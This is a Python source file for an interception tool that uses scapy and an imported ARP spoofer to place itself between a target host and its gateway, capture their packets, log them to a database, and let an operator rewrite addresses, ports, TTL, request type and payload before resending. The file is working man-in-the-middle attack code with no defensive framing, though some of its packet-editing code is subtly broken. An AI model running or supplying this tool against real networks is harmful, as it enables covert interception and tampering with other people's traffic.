from scapy.all import *
from scapy.layers.inet import IP, TCP

from arpspoofer import ArpSpoofer
from database import DataBase


class Sniffer:

    def __init__(self, destinationMac, targetIP, gatewayIP, sourceMAC):
        self.spoofer = ArpSpoofer(destinationMac, targetIP, gatewayIP, sourceMAC)
        self.db = DataBase()
        self.packets = 0

    def start_spoofing(self):
        self.spoofer.start()

    def victim_filter(self, packet):
        return IP in packet and packet[IP].src == self.spoofer.targetIP

    def receive_victim(self):
        p = sniff(count=1, lfilter=self.victim_filter)
        return p

    def router_filter(self, packet):
        return IP in packet and packet[IP].src == self.spoofer.gatewayIP

    def receive_router(self):
        p = sniff(count=1, lfilter=self.router_filter)
        return p

    def send_packet(self, packet):
        send(packet)

    def edit_packet(self, packet, src_ip, dst_ip, req_type, req_params, data, src_port, dst_port, ttl):
        if src_ip != None:
            packet[IP].src = src_ip
        if dst_ip != None:
            packet[IP].dst = dst_ip
        if req_type != None:
            req = self.find_req_type(packet)
            packet[Raw].replace(req, req_type)
        if data != None:
            packet[Raw].load = data
        if req_params != None:
            self.change_req_params(req_params, packet)
        if src_port != None:
            packet[TCP].sport = src_port
        if dst_port != None:
            packet[TCP].dport = dst_port
        if ttl != None:
            packet[IP].ttl = ttl

    def find_req_type(self, packet):
        txt = packet[Raw].load
        list = txt.split()
        return list[0]

    def change_req_params(self, req_params, packet):
        txt = packet[Raw].load
        list = txt.split()
        list[1] = req_params
        " ".join(list)
        packet[Raw].load = list

    def handle_packets_from_victim(self):
        print("start h/p/v")
        packets = self.receive_victim()
        packet = packets[0]
        try:
            self.db.write_to_victim(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
                                    packet[Raw].load, packet[TCP].sport, packet[TCP].dport)
        except:
            packet.show()
        # fetchall returns list of tupples
        self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
        self.packets += 1
        param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
                      "src_port": None, "dst_port": None, "ttl": None}
        for key in param_dict:
            param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
            if (param != ''):
                param_dict[key] = param
        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
                         param_dict["req_params"],
                         param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
        self.db.write_to_victim_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
                                        packet[TCP].sport, packet[TCP].dport)
        self.send_packet(packet)

    def handle_packets_from_router(self):
        print("h/p/r")
        packets = self.receive_router()
        packet = packets[0]
        self.db.write_to_router(self.packets, packet[IP].src, packet[IP].dst, self.find_req_type(packet),
                                packet[Raw].load,packet[TCP].sport, packet[TCP].dport)
        # fetchall returns list of tupples
        self.db.get_from_router(self.packets, True, True, True, True, True, True, True)
        self.packets += 1
        param_dict = {"src_ip": None, "dst_ip": None, "req_type": None, "req_params": None, "data": None,
                      "src_port": None, "dst_port": None, "ttl": None}
        for key in param_dict:
            param = input("enter: " + str(key) + ", if you don't want to press ENTER KEY:\n")
            if (param != ''):
                param_dict[key] = param
        self.edit_packet(packet, param_dict["src_ip"], param_dict["dst_ip"], param_dict["req_type"],
                         param_dict["req_params"],
                         param_dict["data"], param_dict["src_port"], param_dict["dst_port"], param_dict["ttl"])
        self.db.write_to_router_changed(packet[IP].src, packet[IP].dst, self.find_req_type(packet), packet[Raw].load,
                                        packet[TCP].sport, packet[TCP].dport)
        self.send_packet(packet)
